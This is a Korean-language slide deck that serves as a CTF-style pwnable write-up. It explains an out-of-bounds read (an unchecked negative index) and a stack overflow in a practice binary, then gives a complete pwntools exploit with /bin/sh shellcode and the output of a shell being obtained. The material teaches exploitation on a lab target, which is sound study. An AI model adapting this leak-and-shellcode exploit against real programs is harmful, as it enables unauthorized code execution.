---
marp: true
---

Out-Of-Bound

# 배경

배열의 범위를 벗어난 메모리에 접근할 수 있는 취약점. 개발자가 인덱스에 대한 검사를 제대로 하지 않으면 발생함. 임의 주소 읽기, 임의 주소 쓰기로 이어질 수 있음.
이 취약점과 관련해서는 `gcc`에서 아무런 경고도 띄워주지 않음

문자열 함수는 널바이트를 찾을 때까지 배열을 참조하므로,
코드를 작성할 때 정의한 배열의 크기를 넘어서도 계속해서 인덱스를 증가시킴
이런 동작으로 인해 참조하려는 인덱스 값이 배열의 크기보다 커지는 현상을 Index Out-Of-Bound라고 부름

---

# 예시1(easypwn)

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
//compile option: gcc -m32 -z execstack -fno-stack-protector -o check main_2.c

void title(void){
    printf("1: array randomize\n");
    printf("2: array sort\n");
    printf("3: print array\n");
    printf("4: print a number in array\n");
    printf("5: exit\n");
}

void swap(int *xp, int *yp) {
    int tmp = *xp;
    *xp = *yp;
    *yp = tmp;
}

void bubbleSort(int arr[], int n) {
    int i;
    if (n == 1)
        return;

    for (i = 0; i < n - 1; i++)
        if (arr[i] > arr[i + 1])
            swap(&arr[i], &arr[i + 1]);

    bubbleSort(arr, n - 1);
}
```

---

```c
int main(void){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    srand(time(NULL));
    char feedback[100];
    int arr[20];
    int input;
    int i;

    while(1){
        title();
        scanf("%d", &input);

        if(input == 1){
            for(i = 0; i < 20; i++){
                arr[i] = rand() % 99 + 1;
            }
        }
        else if(input == 2){
            bubbleSort(arr, 20);
        }
        else if(input == 3){
            for(i = 0; i < 20; i++)
                printf("arr[%d] = %d\n", i, arr[i]);
        }
        else if(input == 4){
            printf("give me a index you want to know\n");
            scanf("%d", &input);
            if(input < 20)
                printf("arr[%d] = %d\n", input, arr[input]);
            else{
                printf("index is under 19\n");
            }
            input = 4;
        }
        else if(input == 5){
            printf("Write some feedback if you have\n");
            read(0, feedback, 200);
            return 0;
        }
        else{
            printf("Worng input!\n");
        }
    }
    return 0;
}
```

---

## 분석

```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/easyoob]
└─$ checksec ./easypwn
[*] '/home/foo1/Desktop/kknock/pwnable/easyoob/easypwn'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

full relro라 got overwrite같은 공격은 힘들 것 같고
스택에서 코드 실행이 가능하므로 쉘코드를 넣을 예정임
특이한 점은 RWX라는게 있는데, 읽기, 쓰기, 실행 권한이 모두 설정된 메모리 세그먼트가 있다는 것을 나타낸다고 함 
아마 이것도 공격 백터 중 하나로 사용할 수 있을 것 같긴 한데, 잘 모르겠음음


초기화하기 전에 배열의 요소들을 출력할 수 있는데,
이전에 다른 함수를 호출하였다면 스택을 생성했을 것이고, 해당 스택에서 사용한 데이터가 그대로 남아 있음

```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/easyoob]
└─$ ./easypwn
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
3
arr[0] = -134526160
arr[1] = 1
arr[2] = 0
arr[3] = 1
arr[4] = -134527840
arr[5] = 1
...
arr[16] = 0
arr[17] = 0
arr[18] = 0
arr[19] = 0
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
```

---

난수 데이터를 생성, 정렬하고 출력하는 것을 알 수 있음

```sh
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
1
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
2
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
3
arr[0] = 6
arr[1] = 6
arr[2] = 17
arr[3] = 25
arr[4] = 26
arr[5] = 27
arr[6] = 27
arr[7] = 38
...
arr[18] = 78
arr[19] = 86
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
```

---

취약점이 있는 곳은 4, 5번 매뉴임
4번은 인덱스 검증이 제대로 되지 않아 OOB취약점이 발생
20을 넘는 인덱스에 대해선 제대로 필터링 하지만, 음수는 필터링하지 못함

```sh
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
4
give me a index you want to know
-1
arr[-1] = -1
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
4
give me a index you want to know
100
index is under 19
1: array randomize
2: array sort
3: print array
4: print a number in array
5: exit
```

---

5번도 배열의 크기보다 더 많은 데이터를 입력할 수 있어 SBO 취약점이 발생
`read(0, feedback, 200);`

```sh
0x00001518 <+460>:	mov    eax,DWORD PTR [ebp-0xc4]
0x0000151e <+466>:	cmp    eax,0x5
0x00001521 <+469>:	jne    0x1552 <main+518>
0x00001523 <+471>:	sub    esp,0xc
0x00001526 <+474>:	lea    eax,[ebx-0x1f14]
0x0000152c <+480>:	push   eax
0x0000152d <+481>:	call   0x1080 <puts@plt>
0x00001532 <+486>:	add    esp,0x10
0x00001535 <+489>:	sub    esp,0x4
0x00001538 <+492>:	push   0xc8
0x0000153d <+497>:	lea    eax,[ebp-0x70]
0x00001540 <+500>:	push   eax
0x00001541 <+501>:	push   0x0
0x00001543 <+503>:	call   0x1050 <read@plt>
0x00001548 <+508>:	add    esp,0x10
0x0000154b <+511>:	mov    eax,0x0
0x00001550 <+516>:	jmp    0x1569 <main+541>
```

---

먼저 OOB취약점에 대해 생각해보면, 음수 인덱스만 접근할 수 있으므로, `main`쪽 SFP, RET 방향에 있는 데이터는 접근하기 힘듬
따라서 반대 방향에 쓸만한 정보가 있는지 찾아봐야 함
GDB로 분석해보면 사용되고 버려진 데이터들이 꽤 많다는 걸 확인 할 수 있음
```sh
pwndbg> telescope $esp-40 50
00:0000│-0f0 0xffffcf18 —▸ 0xffffcf34 —▸ 0xffffcf44 ◂— 0x4
01:0004│-0ec 0xffffcf1c ◂— 0x2
02:0008│-0e8 0xffffcf20 —▸ 0x56557053 ◂— '5: exit'
03:000c│-0e4 0xffffcf24 —▸ 0x56558fb4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ebc
04:0010│-0e0 0xffffcf28 —▸ 0xf7c58c69 (__isoc99_scanf+9) ◂— add eax, 0x1d1397
05:0014│-0dc 0xffffcf2c —▸ 0x565563ce (main+130) ◂— add esp, 0x10
06:0018│-0d8 0xffffcf30 —▸ 0x5655705b ◂— 0x61006425 /* '%d' */
07:001c│ ecx 0xffffcf34 —▸ 0xffffcf44 ◂— 0x4
08:0020│-0d0 0xffffcf38 —▸ 0xffffd008 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...
09:0024│-0cc 0xffffcf3c —▸ 0x565563b8 (main+108) ◂— sub esp, 8
0a:0028│ esp 0xffffcf40 —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...
0b:002c│-0c4 0xffffcf44 ◂— 0x4
0c:0030│-0c0 0xffffcf48 —▸ 0xf7fbeb30 —▸ 0xf7c1acc6 ◂— 'GLIBC_PRIVATE'
0d:0034│-0bc 0xffffcf4c ◂— 0x1
0e:0038│-0b8 0xffffcf50 ◂— 0x0
0f:003c│-0b4 0xffffcf54 ◂— 0x1
10:0040│-0b0 0xffffcf58 —▸ 0xf7fbe4a0 —▸ 0xf7c00000 ◂— 0x464c457f
11:0044│-0ac 0xffffcf5c ◂— 0x1
12:0048│-0a8 0xffffcf60 ◂— 0xc00000
13:004c│-0a4 0xffffcf64 ◂— 0x0
14:0050│-0a0 0xffffcf68 ◂— 0x1
15:0054│-09c 0xffffcf6c ◂— 0x0
16:0058│-098 0xffffcf70 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
17:005c│-094 0xffffcf74 ◂— 0x20 /* ' ' */
18:0060│-090 0xffffcf78 ◂— 0x0
...
```

이렇게 런타임 중에 메모리에 적재된 데이터들의 위치를 확인하여 5번 매뉴에서 SBO를 할 수 있게 만들어야 함
여러 번 분석해보니 전체적으로 크게 스택에 있는 데이터가 변하지 않아 0xffffcf34에 해당하는 값을 leak할 수 있음

---


이 문제는 에필로그가 상당히 독특한데, esp에 `[ebp-0x8]`, pop 3번 esp에 `[ecx-0x4]`를 넣는 과정이 있음
그런데 esp(`[ecx-0x4]`)에는 쉘코드의 시작 주소가 담겨 있어야 하고, 가장 마지막 read를 할 때 쉘코드 시작 주소가 필요하므로 payload에 두번의 쉘코드 시작 주소가 담기게 됨
```sh
0x00001569 <+541>:	lea    esp,[ebp-0x8]
0x0000156c <+544>:	pop    ecx
0x0000156d <+545>:	pop    ebx
0x0000156e <+546>:	pop    ebp
0x0000156f <+547>:	lea    esp,[ecx-0x4]
0x00001572 <+550>:	ret   
```



# exploit
```python
from pwn import *

#sp=gdb.debug('./easypwn')
p=process('./easypwn')
e=ELF('./easypwn')
context.log_level='DEBUG'

shellcode=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

#stage1 - stack base leak
p.recvuntil('5: exit')
p.sendline(b'4')
p.recvuntil('know\n')
#p.sendline(b'-3')	#(main+108)
p.sendline(b'-5')	#esp+0xc
p.recvuntil('= ')
stack_shellcode_entry=(int(p.recvline())-4+0x5c)&0xFFFFFFFF	
print(stack_shellcode_entry)

#stage2
p.recvuntil('5: exit')
p.sendline(b'5')
p.recvuntil('have\n')

payload=b''
payload+=p32(stack_shellcode_entry)
payload+=shellcode.ljust(0x64,b'a')
payload+=p32(stack_shellcode_entry)

p.sendline(payload)
p.interactive()
```

아래 부분에서 ljust()를 사용하는 부분이 있는데, 이상하게도 rjust로 해도 동일한 결과를 만들어냄 
처음에는 `b'a'`가 아닌 `b'\x90'`로 [[NOP sled]]를 해보고 싶었던 것이었는데, 실수로 a를 넣고 했는데도 이런 현상이 나옴
이유는 잘 모르겠음
```python
payload+=shellcode.ljust(0x64,b'a')
```

# 실행 결과
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/pwnable/easyoob]
└─$ python3 exploit.py 
[+] Starting local process './easypwn': pid 28432
[*] '/home/foo1/Desktop/kknock/pwnable/easyoob/easypwn'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
/home/foo1/Desktop/kknock/pwnable/easyoob/exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
...
    00000000  9c ac c7 ff  31 c0 50 68  2f 2f 73 68  68 2f 62 69  │····│1·Ph│//sh│h/bi│
    00000010  6e 89 e3 50  53 89 e1 31  d2 b0 0b cd  80 61 61 61  │n··P│S··1│····│·aaa│
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  61 61 61 61  61 61 61 61  9c ac c7 ff  0a           │aaaa│aaaa│····│·│
    0000006d
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x43 bytes:
    b'easyoob.zip  easypwn  exploit.py  hosukexploit.py  main.c  test.py\n'
easyoob.zip  easypwn  exploit.py  hosukexploit.py  main.c  test.py
$  

```